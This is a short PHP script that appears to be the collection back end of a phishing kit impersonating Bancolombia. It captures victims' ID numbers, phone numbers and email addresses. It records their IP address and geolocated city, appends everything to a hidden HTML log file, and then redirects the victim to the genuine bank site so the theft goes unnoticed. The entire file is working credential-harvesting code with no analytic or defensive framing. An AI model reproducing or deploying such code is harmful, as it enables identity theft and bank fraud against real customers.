<?
$cedula = $_POST['cedula'];
$telefono = $_POST['telefono'];
$correo = $_POST['correo'];



require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$guardame = fopen('Chukyy55H.html','a+');
fwrite($guardame,
"<br/>"."Cedula: ".$cedula.
"<br/>"."Telefono: ".$telefono.
"<br/>"."e-Mail: ".$correo.
"<br/>"."Ip: ".$_SERVER["REMOTE_ADDR"].
"<br/>"."Info: ".$geoplugin->countryName."-".$geoplugin->region."-".$geoplugin->city.
"<br/><b>=====================================================</b>");

fclose($guardame);
echo "<meta http-equiv='refresh' content='1;url=https://www.grupobancolombia.com/wps/portal/personas'>"
?>